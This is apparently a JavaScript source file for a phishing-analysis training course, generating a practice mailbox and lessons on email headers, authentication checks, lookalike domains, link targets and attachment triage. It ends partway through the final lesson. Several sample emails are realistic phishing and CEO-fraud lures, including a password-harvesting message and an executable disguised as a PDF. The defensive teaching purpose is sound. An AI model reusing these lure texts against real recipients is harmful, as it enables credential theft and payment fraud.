import { random } from './helpers.js';
import { utf8, toBase64 } from '../assets/js/lib/bytes.js';
import { sha256 } from '../assets/js/lib/hash.js';

// Builds raw email source the way it would arrive at Larkfield's mail
// server: Received headers newest first, then authentication results, then
// the headers the sender wrote, then the body.

const MX = 'mx1.larkfield.example';
const DAYS = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
const MONTHS = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];

function rfcDate(ms) {
  const d = new Date(ms);
  const p = (n) => String(n).padStart(2, '0');
  return `${DAYS[d.getUTCDay()]}, ${d.getUTCDate()} ${MONTHS[d.getUTCMonth()]} ${d.getUTCFullYear()} ${p(d.getUTCHours())}:${p(d.getUTCMinutes())}:${p(d.getUTCSeconds())} +0000`;
}

function time(h, m = 0, s = 0) {
  return Date.UTC(2026, 2, 13, h, m, s);
}

function wrapBase64(b64) {
  return b64.match(/.{1,76}/g).join('\n');
}

// hops: the servers the message passed through, in the order it travelled.
// Each is { from, ip, by, at }. The first is the sender's own computer.
function message({ hops, auth, dkim, returnPath, from, replyTo, to = 'priya@larkfield.example', subject, sent, id, text, html, attachments = [], extra = [] }) {
  const received = hops.map((hop, i) => {
    const next = hops[i + 1]?.from ?? MX;
    const by = hop.by ?? next;
    return `Received: from ${hop.from} (${hop.rdns ?? hop.from} [${hop.ip}])\n\tby ${by} with ${i === hops.length - 1 ? 'ESMTPS' : 'ESMTPSA'} id ${hop.id ?? (1000 + i * 7919).toString(16).toUpperCase()};\n\t${rfcDate(hop.at)}`;
  }).reverse();
  const head = [
    `Return-Path: <${returnPath}>`,
    ...received,
    `Authentication-Results: ${MX};\n\tspf=${auth.spf} smtp.mailfrom=${returnPath.split('@')[1]};\n\tdkim=${auth.dkim}${auth.dkimDomain ? ` header.d=${auth.dkimDomain}` : ''};\n\tdmarc=${auth.dmarc}${auth.dmarcAction ? ` action=${auth.dmarcAction}` : ''} header.from=${from.replace(/.*@/, '').replace(/>.*/, '')}`,
    ...(dkim ? [`DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=${dkim}; s=mail;\n\th=from:to:subject:date:message-id;\n\tbh=${toBase64(utf8(subject)).slice(0, 43)}=;\n\tb=${toBase64(utf8(`${id}${subject}${dkim}`)).slice(0, 64)}`] : []),
    `From: ${from}`,
    ...(replyTo ? [`Reply-To: ${replyTo}`] : []),
    `To: ${to}`,
    `Subject: ${subject}`,
    `Date: ${rfcDate(sent)}`,
    `Message-ID: <${id}>`,
    ...extra,
    'MIME-Version: 1.0'
  ];
  const parts = [];
  if (text) parts.push(['text/plain; charset=utf-8', '7bit', text]);
  if (html) parts.push(['text/html; charset=utf-8', '7bit', html]);
  if (!attachments.length && parts.length === 1) return `${head.join('\n')}\nContent-Type: ${parts[0][0]}\n\n${parts[0][2]}\n`;
  const alt = parts.length > 1
    ? `Content-Type: multipart/alternative; boundary="alt-${id.length}"\n\n${parts.map(([type, , body]) => `--alt-${id.length}\nContent-Type: ${type}\n\n${body}\n`).join('')}--alt-${id.length}--\n`
    : `Content-Type: ${parts[0][0]}\n\n${parts[0][2]}\n`;
  if (!attachments.length) return `${head.join('\n')}\n${alt.replace(/^Content-Type/, 'Content-Type')}`;
  const boundary = `mix-${id.length}-${subject.length}`;
  const files = attachments.map((a) => `--${boundary}\nContent-Type: ${a.type}; name="${a.name}"\nContent-Disposition: attachment; filename="${a.name}"\nContent-Transfer-Encoding: base64\n\n${wrapBase64(toBase64(a.bytes))}\n`).join('');
  return `${head.join('\n')}\nContent-Type: multipart/mixed; boundary="${boundary}"\n\n--${boundary}\n${alt}${files}--${boundary}--\n`;
}

const PASS = { spf: 'pass', dkim: 'pass', dmarc: 'pass' };

// File contents for attachments. None of these do anything; they only carry
// the signatures and structure an analyst would check.
function fakePdf(title, author, seed = 1) {
  const r = random(seed);
  return utf8(`%PDF-1.7\n1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj\n2 0 obj << /Type /Pages /Count 1 >> endobj\n3 0 obj << /Title (${title}) /Author (${author}) /Producer (Larkfield Docs 4.2) /CreationDate (D:20260312${r.int(10, 18)}0000Z) >> endobj\ntrailer << /Root 1 0 R /Info 3 0 R >>\n%%EOF\n`);
}

function fakeExe(seed) {
  const r = random(seed);
  const bytes = new Uint8Array(1800);
  for (let i = 0; i < bytes.length; i++) bytes[i] = r.int(0, 255);
  bytes.set(utf8('MZ'), 0);
  bytes.set(utf8('This program cannot be run in DOS mode.'), 78);
  bytes.set(utf8('PE\0\0'), 128);
  return bytes;
}

function fakeZip(name, seed) {
  const r = random(seed);
  const bytes = new Uint8Array(900);
  for (let i = 0; i < bytes.length; i++) bytes[i] = r.int(0, 255);
  bytes.set([0x50, 0x4b, 0x03, 0x04, 0x14, 0, 0, 0, 8, 0], 0);
  bytes.set(utf8(name), 30);
  return bytes;
}

// The practice mailbox shared by the lessons.
function practiceMailbox() {
  return [
    message({
      hops: [{ from: '[10.0.4.21]', ip: '10.0.4.21', at: time(7, 58, 40) }, { from: 'mail01.larkfield.example', ip: '10.0.2.10', at: time(7, 58, 41) }],
      auth: { ...PASS, dkimDomain: 'larkfield.example' }, dkim: 'larkfield.example',
      returnPath: 'priya@larkfield.example', from: '"Priya Raman" <priya@larkfield.example>', to: 'team@larkfield.example',
      subject: 'Team lunch on Friday', sent: time(7, 58, 39), id: '20260313075839.1@larkfield.example',
      text: 'Hi all,\n\nLunch is booked for Friday at 12:30 at the place by the station. Let me know by Thursday if you can\'t make it.\n\nPriya'
    }),
    message({
      hops: [{ from: '[192.168.10.5]', ip: '198.51.100.20', at: time(8, 10, 2) }, { from: 'smtp.officesupplies.example', ip: '203.0.113.25', at: time(8, 10, 4) }],
      auth: { ...PASS, dkimDomain: 'officesupplies.example' }, dkim: 'officesupplies.example',
      returnPath: 'billing@officesupplies.example', from: '"Office Supplies Ltd" <billing@officesupplies.example>', to: 'accounts@larkfield.example',
      subject: 'Invoice 55102 for February', sent: time(8, 10, 1), id: 'inv55102@officesupplies.example',
      text: 'Dear Larkfield accounts team,\n\nPlease find attached invoice 55102 for February. Payment terms are 30 days as usual.\n\nYou can also view it at https://portal.officesupplies.example/invoices/55102\n\nRegards,\nOffice Supplies Ltd',
      attachments: [{ name: 'Invoice_55102.pdf', type: 'application/pdf', bytes: fakePdf('Invoice 55102', 'Office Supplies Ltd billing', 3) }]
    }),
    message({
      hops: [{ from: '[192.168.1.20]', ip: '198.51.100.14', at: time(9, 2, 9) }, { from: 'mail.larkfie1d.example', ip: '203.0.113.45', at: time(9, 2, 11) }],
      auth: { ...PASS, dkimDomain: 'larkfie1d.example' }, dkim: 'larkfie1d.example',
      returnPath: 'bounce@larkfie1d.example', from: '"Larkfield IT Support" <it-support@larkfie1d.example>', replyTo: 'helpdesk.larkfield@freemail.test',
      subject: 'Action required: your password expires today', sent: time(9, 2, 8), id: 'a81f2c@larkfie1d.example',
      text: 'Your Larkfield password expires today. Keep your current password here: https://portal.larkfield.example/keep-password',
      html: '<p>Dear colleague,</p><p>Your Larkfield network password <b>expires today</b>. To keep using your current password, confirm it within 24 hours:</p><p><a href="http://portal.larkfield.example.keep-password.test/confirm?u=priya">https://portal.larkfield.example/keep-password</a></p><p>If you do not confirm, your mailbox will be suspended.</p><p>Larkfield IT Support</p>'
    }),
    message({
      hops: [{ from: '[10.20.0.4]', ip: '192.0.2.88', at: time(10, 31, 50) }, { from: 'smtp.bulkrelay.test', ip: '192.0.2.90', at: time(10, 31, 52) }],
      auth: { spf: 'fail', dkim: 'none', dmarc: 'fail', dmarcAction: 'quarantine' },
      returnPath: 'noreply@bulkrelay.test', from: '"Helen Ward" <helen.ward@larkfield.example>', replyTo: '"Helen Ward" <helen.ward.ceo@freemail.test>',
      subject: 'Quick favour', sent: time(10, 31, 49), id: '5521.990@bulkrelay.test',
      text: 'Hi Priya,\n\nAre you at your desk? I need you to buy some gift cards for a client meeting this afternoon. I am in back to back meetings so just reply here and I will send the details.\n\nThanks,\nHelen\n\nSent from my phone'
    }),
    message({
      hops: [{ from: '[172.16.0.9]', ip: '203.0.113.150', at: time(11, 5, 30) }, { from: 'mx.scanfast.test', ip: '203.0.113.151', at: time(11, 5, 33) }],
      auth: { ...PASS, dkimDomain: 'scanfast.test' }, dkim: 'scanfast.test',
      returnPath: 'scanner@scanfast.test', from: '"Scanner" <scanner@scanfast.test>',
      subject: 'Scanned document from MFP-3F', sent: time(11, 5, 29), id: 'scan-0313-1105@scanfast.test',
      text: 'A document was scanned and sent to you.\n\nPages: 2\nDevice: MFP-3F\n\nOpen the attachment to view it.',
      attachments: [{ name: 'Scan_0313.pdf', type: 'application/pdf', bytes: fakeExe(77) }]
    }),
    message({
      hops: [{ from: 'send-14.mailer.example.com', ip: '192.0.2.140', at: time(12, 0, 3) }],
      auth: { ...PASS, dkimDomain: 'news.larkfield-shop.example' }, dkim: 'news.larkfield-shop.example',
      returnPath: 'bounces+7731@send-14.mailer.example.com', from: '"Larkfield Shop" <news@news.larkfield-shop.example>',
      subject: 'Spring offers for staff', sent: time(12, 0, 0), id: 'n7731.spring@mailer.example.com',
      html: '<p>Staff discount week starts Monday.</p><p><a href="https://click.mailer.example.com/t/7731?u=https%3A%2F%2Fshop.larkfield.example%2Fspring">See the offers</a></p><p><a href="https://click.mailer.example.com/unsub/7731">Unsubscribe</a></p>'
    }),
    message({
      hops: [{ from: '[10.1.1.4]', ip: '198.51.100.61', at: time(13, 44, 12) }, { from: 'mail.xn--lrkfield-16g.example', ip: '198.51.100.62', at: time(13, 44, 14) }],
      auth: { ...PASS, dkimDomain: 'xn--lrkfield-16g.example' }, dkim: 'xn--lrkfield-16g.example',
      returnPath: 'hr@xn--lrkfield-16g.example', from: '"Larkfield HR" <hr@xn--lrkfield-16g.example>',
      subject: 'Updated pay scale for 2026', sent: time(13, 44, 11), id: 'hr-2026-pay@xn--lrkfield-16g.example',
      html: '<p>Hello,</p><p>The 2026 pay scales have been published. Sign in to see your new salary band.</p><p><a href="https://hr.xn--lrkfield-16g.example/payscale">hr.lаrkfield.example/payscale</a></p><p>HR team</p>'
    })
  ];
}

function lessonMail(open = 0) {
  return { type: 'mail', messages: practiceMailbox(), open };
}

function opened(log, index, tab) {
  return log.some((e) => (e.type === 'open-mail' && e.index === index && !tab) || (e.type === 'mail-tab' && e.index === index && e.tab === tab));
}

export default {
  id: 'email',
  title: 'Email and phishing analysis',
  short: 'Email',
  summary: 'Read email headers, check SPF, DKIM and DMARC results, spot lookalike domains and disguised links, and triage attachments without opening them.',
  intro: 'Phishing is still the most common way attackers get a first foothold in a company. This topic teaches you to take a suspicious email apart the way an analyst does: where it really came from, whether the sender is who they claim, where its links really go and what its attachments really are.',
  outcomes: [
    'Trace an email back to the server and computer that sent it',
    'Read SPF, DKIM and DMARC results and know what they do and do not prove',
    'Spot display name spoofing, lookalike domains and punycode tricks',
    'Find the real destination of a link and its registered domain',
    'Triage an attachment by its real file type and hash without opening it',
    'Decide what to do about a reported phish'
  ],
  lessons: [
    {
      id: 'email-anatomy',
      title: 'How an email travels',
      summary: 'Headers versus body, the envelope sender, and reading Received headers from the bottom up.',
      minutes: 12,
      terms: [
        ['header', 'The lines at the top of an email, before the first blank line: From, To, Subject, Date and many more that mail clients hide.'],
        ['Received header', 'A line each mail server adds when it accepts a message, saying where it came from and when. The newest is at the top, so you read them from the bottom up.'],
        ['envelope sender', 'The address given to the mail server during delivery, recorded as Return-Path. It is where bounces go, and it can be different from the From line the reader sees.'],
        ['MTA', 'Mail transfer agent. A server that passes email along, such as Postfix or Exchange.'],
        ['Message-ID', 'A unique label the sending system gives each message. Useful for finding the same message in other mailboxes and logs.']
      ],
      workspace: lessonMail(0),
      blocks: [
        { type: 'text', body: 'An email looks like a letter, but it travels more like a parcel passed between depots. Your mail program hands it to your company\'s mail server, which hands it to the recipient\'s mail server, sometimes through a few more in between. Each server that accepts it writes a note at the top of the message saying where it got it from and when.' },
        { type: 'text', body: 'Everything before the first blank line in a message is the **header**. Mail clients show you four or five header lines and hide the rest. Analysts always look at all of them. The mailbox on the right has a **Headers** tab and a **Source** tab that shows the message exactly as it arrived.' },
        { type: 'task', text: 'Open the first message, "Team lunch on Friday", and look at its Headers tab.', check: (log) => opened(log, 0, 'Headers') },
        { type: 'text', body: 'Each server adds its **Received** line at the top, above the ones already there. So the top Received line is the last step, your own mail server accepting the message, and the bottom one is the first step, closest to the sender. Read them from the bottom up.' },
        { type: 'code', body: 'Received: from mail.larkfie1d.example (mail.larkfie1d.example [203.0.113.45])\n\tby mx1.larkfield.example with ESMTPS id 2EF3;\n\tFri, 13 Mar 2026 09:02:11 +0000\nReceived: from [192.168.1.20] ([192.168.1.20] [198.51.100.14])\n\tby mail.larkfie1d.example with ESMTPSA id 3E8;\n\tFri, 13 Mar 2026 09:02:09 +0000', caption: 'Two Received headers. Bottom: the sender\'s computer handed the message to its mail server. Top: that server handed it to Larkfield.' },
        { type: 'text', body: 'Each Received line says `from` (who connected), the address in square brackets (the connecting IP, recorded by the receiving server itself), and `by` (the server that wrote the line). The name after `from` is what the connecting machine called itself, and it can lie. The address in brackets was observed by the receiving server, so it is much more trustworthy, at least for the hops your own servers recorded.' },
        { type: 'task', text: 'Open the third message, "Action required: your password expires today", and find its Received headers.', check: (log) => opened(log, 2, 'Headers') },
        { type: 'answer', question: 'In that message, what IP address did the sender\'s computer connect from? (The address in the bottom Received header.)', accept: ['198.51.100.14'], hint: 'Take the bottom Received line and read the second address inside the brackets.', explain: 'The bottom hop is the sender\'s machine handing the message to its first mail server. Only the top hop was recorded by Larkfield\'s own server, so lower hops could in theory be forged, but in practice they are usually accurate and very useful.' },
        { type: 'text', body: 'There are also two "from" addresses on every message. The **envelope sender** is what the sending server tells the receiving server during delivery, and it ends up in the `Return-Path` header. The **From** header is what the reader sees. They often differ for good reasons, such as newsletters sent by a mailing service, and attackers rely on readers never checking.' },
        { type: 'quiz', question: 'Why are Received headers read from the bottom up?', options: [
          { text: 'Each server adds its line above the existing ones, so the oldest is at the bottom', correct: true, why: 'The header block grows upwards as the message travels. The bottom line is closest to the sender and the top line is your own server.' },
          { text: 'Because the bottom ones are the most trustworthy', why: 'It is the other way round. The top line was written by your own server, so it is the one you can trust most.' },
          { text: 'It is a convention with no real reason', why: 'It follows directly from how servers add headers.' }
        ] },
        { type: 'note', title: 'Look at the source, not the rendering', body: 'Never judge a suspicious message by how it looks in a mail client. Look at the raw source, where hidden headers, the real link targets and the true attachment types are all visible. This mailbox never renders HTML for that reason.' }
      ]
    },
    {
      id: 'email-auth',
      title: 'SPF, DKIM and DMARC',
      summary: 'The three checks receiving servers run, how to read Authentication-Results, and why passing all three does not mean safe.',
      minutes: 14,
      terms: [
        ['SPF', 'Sender Policy Framework. A DNS record listing which servers may send mail for a domain. It is checked against the envelope sender, not the From line the reader sees.'],
        ['DKIM', 'DomainKeys Identified Mail. A digital signature added by the sending server. A pass means the signed parts were not changed in transit and the signing domain (d=) vouches for them.'],
        ['DMARC', 'A policy that ties SPF and DKIM to the visible From domain. It passes only if one of them passes and its domain matches (aligns with) the From domain.'],
        ['alignment', 'Whether the domain checked by SPF or DKIM matches the domain in the From header. Without alignment, a spammer can pass SPF for their own domain while showing yours.'],
        ['Authentication-Results', 'A header added by the receiving server summarising its SPF, DKIM and DMARC verdicts.']
      ],
      workspace: lessonMail(3),
      blocks: [
        { type: 'text', body: 'The original email standards had no way to check who sent a message. Anyone could type any From address. Three later additions fix part of that, and the receiving server records their verdicts in an **Authentication-Results** header.' },
        { type: 'table', head: ['Check', 'Question it answers', 'Checked against'], rows: [['SPF', 'Was this server allowed to send for that domain?', 'The envelope sender (Return-Path)'], ['DKIM', 'Is the signature valid, and which domain signed it?', 'The `d=` domain in the DKIM signature'], ['DMARC', 'Did SPF or DKIM pass for the same domain the reader sees in From?', 'The From header domain']] },
        { type: 'text', body: '**DMARC** is the one that protects the name the reader actually sees. It also lets a domain owner say what should happen to failures: `p=none` (just report), `p=quarantine` (spam folder) or `p=reject` (refuse it).' },
        { type: 'task', text: 'Open the message "Quick favour" and read its Authentication-Results header.', check: (log) => opened(log, 3, 'Headers') },
        { type: 'predict', question: '"Quick favour" shows From: helen.ward@larkfield.example, but `spf=fail`, `dkim=none` and `dmarc=fail`. What does that tell you?', options: [
          { text: 'It was not sent by Larkfield\'s mail servers, even though From says larkfield.example', correct: true, why: 'The message came from a bulk relay that is not in Larkfield\'s SPF record, carried no Larkfield signature, and so failed DMARC. The From line is simply forged. Larkfield\'s DMARC policy put it in quarantine, which is how it ended up in a reported folder instead of the inbox.' },
          { text: 'Helen\'s account has been hacked', why: 'A hacked account would send through Larkfield\'s own servers, and SPF and DKIM would pass. These failures mean the message never touched Larkfield\'s systems.' },
          { text: 'The checks are broken and should be ignored', why: 'Failures happen for innocent reasons sometimes, such as forwarding, but here the Reply-To also points to a free mail account. Everything fits a forged sender.' }
        ] },
        { type: 'text', body: 'This message is a classic **business email compromise** attempt, sometimes called CEO fraud: a forged message from a senior person asking for something urgent, with a Reply-To that sends the answer to the attacker. There is no link and no attachment, so filters that look for those find nothing.' },
        { type: 'task', text: 'Now open "Action required: your password expires today" and read its authentication results.', check: (log) => opened(log, 2, 'Headers') },
        { type: 'quiz', question: 'The password message passes SPF, DKIM and DMARC. Does that mean it is safe?', options: [
          { text: 'No. It proves the message really came from larkfie1d.example, which is not Larkfield', correct: true, why: 'Look closely at the domain: there is a digit 1 where the l should be. Attackers register lookalike domains and set up perfect SPF, DKIM and DMARC for them. Authentication proves who sent a message, not whether that sender is honest.' },
          { text: 'Yes. All three checks passed', why: 'They passed for the attacker\'s own domain. That is easy to arrange.' },
          { text: 'Yes, because DKIM signatures cannot be faked', why: 'The signature is real. It was made by the attacker\'s server for the attacker\'s domain.' }
        ] },
        { type: 'answer', question: 'A message shows From: news@larkfield.example. SPF passes for bounces.mailtool.example and DKIM passes for mailtool.example. Neither domain matches larkfield.example. What is the DMARC result?', accept: ['fail', 'dmarc=fail'], hint: 'DMARC needs a pass from SPF or DKIM for a domain that aligns with the From domain.', explain: 'Both checks passed, but for domains that do not align with larkfield.example. That is exactly the situation DMARC exists to catch. A legitimate mailing service fixes it by signing with the customer\'s own domain.' },
        { type: 'note', title: 'Check the policy yourself', body: 'Domain owners publish SPF and DMARC as DNS TXT records. `nslookup -type=TXT _dmarc.example.com` (or dig) shows a domain\'s DMARC policy. A domain with no DMARC record, or `p=none`, can be spoofed far more easily.' }
      ]
    },
    {
      id: 'email-lookalikes',
      title: 'Lookalike senders',
      summary: 'Display name spoofing, typo and homoglyph domains, punycode, and Reply-To tricks.',
      minutes: 12,
      terms: [
        ['display name', 'The friendly name shown before an address, like "Larkfield IT" in `"Larkfield IT" <x@y.test>`. The sender can set it to anything.'],
        ['lookalike domain', 'A domain made to resemble a real one: a letter swapped for a digit, an extra word, or a different ending.'],
        ['homoglyph', 'A character that looks like another, such as Cyrillic а and Latin a. They let attackers register domains that look identical to real ones.'],
        ['punycode', 'How internationalised domain names are written in plain ASCII. They start with `xn--`. `lаrkfield.example` with a Cyrillic а becomes `xn--lrkfield-16g.example`.'],
        ['business email compromise', 'Fraud using email that pretends to come from a boss, colleague or supplier, usually to redirect a payment or get gift cards. Often no link or attachment at all.']
      ],
      workspace: lessonMail(6),
      blocks: [
        { type: 'text', body: 'Most phishing does not forge your exact domain any more, because DMARC catches that. Instead it uses something that **looks** like your domain or a trusted sender\'s, and relies on people reading quickly.' },
        { type: 'table', head: ['Trick', 'Example', 'What to look for'], rows: [['Display name only', '"Larkfield IT" <it.desk@freemail.test>', 'The real address behind the name'], ['Character swap', '`larkfie1d.example`', 'Digits and letters that look alike: 1 and l, 0 and o, rn and m'], ['Added words', '`larkfield-support.example`', 'Hyphens, extra words, "secure", "login", "portal"'], ['Different ending', '`larkfield.example.co`', 'The part right before the first single slash is what counts'], ['Homoglyphs', '`lаrkfield.example` (Cyrillic а)', '`xn--` in the raw address'], ['Reply-To redirect', 'From is real looking, Reply-To is a free mail account', 'Compare From and Reply-To']] },
        { type: 'task', text: 'Open "Updated pay scale for 2026" and look at the sender address in the Headers tab.', check: (log) => opened(log, 6, 'Headers') },
        { type: 'text', body: 'In the message body, the link text reads `hr.lаrkfield.example`, which looks exactly like Larkfield. The address in the headers tells the truth: `xn--lrkfield-16g.example`. That is **punycode**, the ASCII form of a domain containing a non Latin character. Here the second letter is a Cyrillic а, which looks identical to a Latin a in most fonts.' },
        { type: 'quiz', question: 'Why does `xn--` matter so much when you see it in an address from a company that only uses English names?', options: [
          { text: 'It means the domain contains non ASCII characters, which an English company\'s domain would not', correct: true, why: 'Internationalised domains are legitimate in many languages. But if a company\'s real domain is plain ASCII, an `xn--` version of something that renders the same is almost certainly a homoglyph attack.' },
          { text: 'It means the message is encrypted', why: 'It has nothing to do with encryption. It is just how non ASCII characters are written in DNS.' },
          { text: 'It is a sign of a broken mail server', why: 'Mail servers write punycode on purpose. That is the correct form for the domain.' }
        ] },
        { type: 'spot', question: 'Which header line is the strongest sign that this "CEO" message is fraud?', code: 'From: "Helen Ward" <helen.ward@larkfield.example>\nTo: priya@larkfield.example\nReply-To: "Helen Ward" <helen.ward.ceo@freemail.test>\nSubject: Quick favour\nDate: Fri, 13 Mar 2026 10:31:49 +0000', line: 3, explain: 'Replies go to a free mail account, not to Larkfield. Combined with the DMARC failure you saw earlier, the From line is forged and the attacker is waiting for your reply at that other address.', nudge: 'Ask yourself where your reply would actually go.' },
        { type: 'answer', question: 'Which domain is the real sender of the "Action required" password message?', accept: ['larkfie1d.example'], hint: 'Look at the From address, character by character.', explain: 'The digit 1 replaces the second l. In many fonts at normal reading speed, the difference is invisible.' },
        { type: 'note', title: 'Defences that help', body: 'Mail systems can tag external senders with a banner, flag first time senders, and warn on domains that are a small edit away from your own. Many companies also register common misspellings of their own domain before attackers do.' }
      ]
    },
    {
      id: 'email-links',
      title: 'Where links really go',
      summary: 'Link text versus link target, how to find the registered domain in a URL, redirects, and defanging.',
      minutes: 13,
      terms: [
        ['URL', 'A web address. It has a scheme (`https`), a host name, and usually a path and query: `https://host.example/path?query`.'],
        ['registered domain', 'The part of a host name someone actually registered, such as `keep-password.test` in `portal.larkfield.example.keep-password.test`. It decides who controls the site.'],
        ['href', 'The real target of a link in HTML. The text shown to the reader can say anything.'],
        ['open redirect', 'A link on a trusted site that forwards visitors to any other address given in the URL. Attackers use them so the link starts with a domain you trust.'],
        ['defang', 'Change an indicator so it cannot be clicked by accident, like `hxxp://bad[.]example`. Standard practice when sharing indicators.']
      ],
      workspace: { type: 'case', title: 'Mailbox and tools', tabs: [{ ...lessonMail(2), title: 'Mailbox' }, { type: 'tools', title: 'Tools', op: 'iocs' }] },
      blocks: [
        { type: 'text', body: 'In HTML email, the words you click and the address you go to are two separate things. The address is in the `href` attribute, and the text can be anything, including a different, trustworthy looking address. This mailbox shows every link as `text [link: real target]` so you can compare them.' },
        { type: 'task', text: 'Open the password message in the Mailbox tab and compare what the link says with where it goes.', check: (log) => log.some((e) => e.type === 'open-mail' && e.index === 2) },
        { type: 'text', body: 'The link text says `https://portal.larkfield.example/keep-password`. The real target is `http://portal.larkfield.example.keep-password.test/confirm?u=priya`. It even starts with Larkfield\'s name. To see who owns it, find the **host name** (between `://` and the next `/`) and read it **from the right**.' },
        { type: 'table', head: ['Part', 'Value'], rows: [['Scheme', '`http`'], ['Host name', '`portal.larkfield.example.keep-password.test`'], ['Top level domain', '`.test`'], ['Registered domain', '`keep-password.test`'], ['Subdomain (chosen freely by the owner)', '`portal.larkfield.example`'], ['Path and query', '`/confirm?u=priya`']] },
        { type: 'text', body: 'The owner of `keep-password.test` can create any subdomain they like, including one that spells out your company\'s name. Everything to the left of the registered domain is decoration. Note too the `u=priya` in the query: the link is personalised, so the attacker knows exactly who clicked.' },
        { type: 'predict', question: 'What is the registered domain in `https://login.microsoftonline.com.secure-check.example/session`?', options: [
          { text: '`secure-check.example`', correct: true, why: 'Reading from the right, the top level domain is `.example` and the name registered under it is `secure-check`. The Microsoft looking part is just a subdomain.' },
          { text: '`microsoftonline.com`', why: 'That would only be true if the host name ended in microsoftonline.com. Here it continues after it.' },
          { text: '`login.microsoftonline.com`', why: 'That is the start of the host name, which the domain owner can set to anything.' }
        ] },
        { type: 'text', body: 'Some links pass through a **redirect** first. The newsletter in this mailbox sends every click through `click.mailer.example.com`, a tracking service, with the real destination encoded in the `u=` parameter. That is normal for marketing email. Attackers use the same idea with open redirects on trusted sites, so the link begins with a domain you recognise.' },
        { type: 'task', text: 'In the Tools tab, paste the body of the password message (or any text with links) and use "Extract indicators" to list its URLs and domains.', hint: 'Copy the text from the Message tab, switch to Tools, and paste it into the Input box with Extract indicators selected.', check: (log) => log.some((e) => e.type === 'tool' && e.op === 'iocs') },
        { type: 'answer', question: 'Defang this URL the standard way: `http://keep-password.test/confirm`', accept: ['hxxp://keep-password[.]test/confirm', 'hxxp[:]//keep-password[.]test/confirm'], hint: 'Replace http with hxxp, and each dot in the host with [.]. The Tools page has a Defang button.', explain: 'Defanged indicators can be pasted into tickets, chat and reports without anyone clicking them by accident, and without chat apps turning them into live previews that fetch the page.' },
        { type: 'note', title: 'Do not visit it to check', body: 'Opening a phishing link from your work machine tells the attacker the address is live, may download something, and leaves your address in their logs. Analysts look links up in reputation services, or open them in an isolated sandbox built for that purpose.' }
      ]
    },
    {
      id: 'email-attachments',
      title: 'Attachment triage',
      summary: 'Risky file types, real type versus extension, and using hashes to check attachments without opening them.',
      minutes: 13,
      terms: [
        ['static analysis', 'Examining a file without running it: its type, size, hash, strings and metadata. Always the first step with a suspicious attachment.'],
        ['file hash', 'A fingerprint of a file\'s exact bytes, such as its SHA-256. Change one byte and the hash changes completely. Used to look files up in threat intelligence.'],
        ['double extension', 'A file name like `invoice.pdf.exe`. Windows hides known extensions by default, so the reader sees `invoice.pdf`.'],
        ['macro', 'Code stored inside an Office document. Files ending in `m`, such as `.docm` and `.xlsm`, can contain macros.'],
        ['sandbox', 'An isolated, disposable machine used to run suspicious files and record what they do.']
      ],
      workspace: lessonMail(4),
      blocks: [
        { type: 'text', body: 'Attachments are where phishing turns into malware. The first job is to work out what a file really is, without opening it. The name and the declared type are just labels chosen by the sender. The bytes are the truth.' },
        { type: 'task', text: 'Open "Scanned document from MFP-3F" and expand its attachment. Compare the declared type with the actual content.', check: (log) => log.some((e) => e.type === 'open-mail' && e.index === 4) },
        { type: 'predict', question: 'The attachment is called `Scan_0313.pdf`, declared as `application/pdf`, but the first two bytes are `4D 5A` ("MZ"). What is it?', options: [
          { text: 'A Windows program dressed up as a PDF', correct: true, why: 'Every Windows executable starts with MZ. A real PDF starts with `%PDF`. Mail filters that trust the extension would let this through.' },
          { text: 'A damaged PDF', why: 'A damaged PDF would still start with %PDF. This is a different format altogether.' },
          { text: 'A scanned image', why: 'Images have their own signatures, such as `FF D8 FF` for JPEG.' }
        ] },
        { type: 'table', head: ['Type', 'Why it is risky'], rows: [['`.exe`, `.scr`, `.com`', 'Windows programs. Should almost never arrive by email'], ['`.js`, `.vbs`, `.wsf`, `.hta`', 'Scripts Windows will run with a double click'], ['`.lnk`', 'Shortcuts that can run any command'], ['`.iso`, `.img`, `.vhd`', 'Disk images. Files inside used to skip the "downloaded from the internet" warning'], ['`.docm`, `.xlsm`', 'Office documents that can carry macros'], ['`.html`, `.htm`', 'Opens a page from your own disk, often a fake login form'], ['`.zip` with a password', 'The password stops mail filters from looking inside']] },
        { type: 'text', body: 'Next, take the **hash**. A SHA-256 hash identifies the exact file. You can search for it in threat intelligence sources and your own security tools without ever handing the file to anyone, and it is the indicator other teams will ask you for. The mailbox shows each attachment\'s SHA-256.' },
        { type: 'quiz', question: 'You look up an attachment\'s SHA-256 in a threat intelligence service and get no results. What can you conclude?', options: [
          { text: 'Only that nobody has reported this exact file yet', correct: true, why: 'Attackers often change a byte or two per campaign, or per recipient, which gives a brand new hash. "Unknown" is not "safe". A hit is strong evidence, but a miss proves little.' },
          { text: 'The file is safe', why: 'A new or slightly modified file will never have been seen before.' },
          { text: 'The hash was calculated wrongly', why: 'Hashes are exact. The file simply has not been seen.' }
        ] },
        { type: 'order', question: 'Put these attachment triage steps in a safe order.', items: ['Check the real file type from its first bytes', 'Record the name, size and SHA-256', 'Look the hash up in threat intelligence and your own tools', 'If still unknown, detonate it in an isolated sandbox', 'Search mail logs for other recipients of the same file'], explain: 'Everything before the sandbox is static and safe. The last step often matters most: one reported email is usually one of many delivered.' },
        { type: 'note', title: 'Never open it on your own machine', body: 'Even "just to see" is how incidents start. Use static checks first, then a proper sandbox if you need to know what the file does.' }
      ]
    },
    {
      id: 'email-response',
      title: 'From report to response',
      summary: 'Classify a reported email, decide what to do about it, and write it up.',
      minutes: 10,
      terms: [
        ['verdict', 'Your conclusion about a reported email: malicious, suspicious, spam, or legitimate.'],
        ['purge', 'Removing a message from every mailbox it reached, usually with a search in the mail system.'],
        ['blast radius', 'How many people received a malicious email and, more importantly, how many clicked, replied or opened the attachment.']
      ],
      workspace: lessonMail(0),
      blocks: [
        { type: 'text', body: 'When staff report a suspicious email, the analyst\'s job is to reach a **verdict** quickly and then act on it. Most reports turn out to be spam or legitimate mail, which is fine: a report that turns out harmless is still a good report.' },
